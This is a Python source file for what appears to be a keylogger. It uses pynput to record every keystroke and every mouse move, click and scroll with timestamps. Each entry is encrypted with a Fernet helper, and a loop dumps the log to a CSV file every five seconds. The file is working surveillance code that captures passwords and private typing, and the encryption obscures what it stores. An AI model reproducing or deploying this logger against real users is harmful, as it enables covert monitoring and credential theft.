from fernet_cipher import encrypt,decrypt
from pynput import mouse, keyboard
import time,csv
from datetime import datetime



field_names= [str(encrypt("Key/Mouse")), 
              str(encrypt("Actions")), 
              str(encrypt("Position")), 
              str(encrypt("time")),
              str(encrypt("date"))]
def stopper(logs):
    time.sleep(5)
    while True:
        with open('keyloging.csv', 'w') as csvfile:
            writer = csv.DictWriter(csvfile, fieldnames=field_names)
            writer.writeheader()
            writer.writerows(logs)
        print("Logs updated successfully")
        time.sleep(5)
        

def on_move(x, y, logs):
    
    mouse_logs = {field_names[0]: encrypt("Mouse"), field_names[1]: encrypt("Pointer moved"), field_names[2]: encrypt(str((x, y))), field_names[3]: encrypt(str(datetime.now().strftime("%H:%M:%S"))), field_names[4]: encrypt(str(datetime.now().date()))}
    logs.append(mouse_logs)
    print('Pointer moved to {0}'.format((x, y)))
    # print(logs)

def on_click(x, y, button, pressed, logs):
    if pressed:
        mouse_logs = {field_names[0]: encrypt("Mouse"), field_names[1]: encrypt("Pressed"), field_names[2]: encrypt(str((x, y))), field_names[3]: encrypt(str(datetime.now().strftime("%H:%M:%S"))), field_names[4]: encrypt(str(datetime.now().date()))}
    else:
        mouse_logs = {field_names[0]: encrypt("Mouse"), field_names[1]: encrypt("Released"), field_names[2]: encrypt(str((x, y))), field_names[3]: encrypt(str(datetime.now().strftime("%H:%M:%S"))), field_names[4]: encrypt(str(datetime.now().date()))}
    logs.append(mouse_logs)
    print('{0} at {1}'.format('Pressed' if pressed else 'Released', (x, y)))

def on_scroll(x, y, dx, dy, logs):
    if dy < 0:
        mouse_logs = {field_names[0]: encrypt("Mouse"), field_names[1]: encrypt("Scrolled up"), field_names[2]: encrypt(str((x, y))), field_names[3]: encrypt(str(datetime.now().strftime("%H:%M:%S"))), field_names[4]: encrypt(str(datetime.now().date()))}
    else:
        mouse_logs = {field_names[0]: encrypt("Mouse"), field_names[1]: encrypt("Scrolled down"), field_names[2]: encrypt(str((x, y))), field_names[3]: encrypt(str(datetime.now().strftime("%H:%M:%S"))), field_names[4]: encrypt(str(datetime.now().date()))}
    logs.append(mouse_logs)
    print('Scrolled {0} at {1}'.format('down' if dy < 0 else 'up', (x, y)))

def on_press(key,logs):
    try:
        keyboard_logs = {field_names[0]: encrypt( str(key)), field_names[1]: encrypt("pressed"), field_names[2]:encrypt("None"),field_names[3]:encrypt(str(datetime.now().strftime("%H:%M:%S"))),field_names[4]:encrypt(str(datetime.now().date()))}
        logs.append(keyboard_logs)

        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        keyboard_logs = {field_names[0]: encrypt( str(key)), field_names[1]: encrypt("pressed"), field_names[2]:encrypt("None"),field_names[3]:encrypt(str(datetime.now().strftime("%H:%M:%S"))),field_names[4]:encrypt(str(datetime.now().date()))}
        logs.append(keyboard_logs)

        print('special key {0} pressed'.format(key))

def on_release(key,logs):
    keyboard_logs = {field_names[0]: encrypt( str(key)), field_names[1]: encrypt("released"), field_names[2]:encrypt("None"),field_names[3]:encrypt(str(datetime.now().strftime("%H:%M:%S"))),field_names[4]:encrypt(str(datetime.now().date()))}
    logs.append(keyboard_logs)

    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        return False

